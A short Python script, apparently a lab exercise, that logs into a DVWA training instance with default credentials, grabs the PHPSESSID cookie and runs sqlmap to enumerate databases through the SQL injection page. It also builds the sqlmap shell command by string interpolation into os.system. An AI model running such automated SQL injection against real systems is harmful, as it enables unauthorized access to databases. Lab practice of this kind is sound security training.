import os
import requests
from bs4 import BeautifulSoup

# URL of the DVWA application
base_url = "http://192.168.64.3/DVWA/"
login_url = base_url + "login.php"
sqli_url = base_url + "vulnerabilities/sqli/?id=1&Submit=Submit"

# DVWA login credentials
dvwa_username = "admin"
dvwa_password = "password"

# Function to login to DVWA and retrieve session ID
def get_session_id():
    with requests.Session() as session:
        # Get initial login page to retrieve the user_token
        response = session.get(login_url)
        soup = BeautifulSoup(response.content, 'html.parser')
        user_token = soup.find('input', {'name': 'user_token'})['value']

        # Login payload
        payload = {
            'username': dvwa_username,
            'password': dvwa_password,
            'Login': 'Login',
            'user_token': user_token
        }

        # Perform login
        session.post(login_url, data=payload)
        
        # Retrieve PHPSESSID from cookies
        session_id = session.cookies.get('PHPSESSID')
        return session_id

# Running SQLMap to detect SQL injection
def run_sqlmap(target_url, session_id):
    os.system(f"sqlmap -u {target_url} --cookie='PHPSESSID={session_id}; security=low' --dbs --batch --level=1 --risk=1")

if __name__ == "__main__":
    session_id = get_session_id()
    run_sqlmap(sqli_url, session_id)
